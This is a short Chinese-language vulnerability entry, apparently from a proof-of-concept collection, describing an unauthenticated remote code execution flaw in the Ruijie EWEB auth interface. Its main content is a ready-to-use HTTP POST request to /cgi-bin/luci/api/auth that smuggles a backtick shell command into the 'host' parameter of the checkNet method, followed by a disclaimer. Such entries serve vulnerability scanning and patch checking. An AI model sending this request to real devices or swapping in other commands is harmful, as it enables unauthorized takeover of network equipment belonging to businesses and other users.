# 锐捷EWEB auth接口远程代码执行漏洞

>锐捷睿易是锐捷网络针对商业市场的子品牌。拥有易网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商贸零售、酒店、KTV、网吧、监控安防、物流仓储、制造业、中小教育、中小医疗、中小政府等商业用户。

## 来源

[https://blog.csdn.net/weixin_52204925/article/details/136566467](https://blog.csdn.net/weixin_52204925/article/details/136566467)

## 简介

锐捷EWEB auth接口存在远程代码执行漏洞，未授权的攻击者可以通过该漏洞执行恶意命令，进而导致服务器失陷。

## 漏洞类型

远程代码执行

## 影响范围

-   锐捷EWEB

## POC

```http
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: {{host}}
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 
{"method":"checkNet","params":{"host":"`echo Hello World!>test.txt`"}}
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
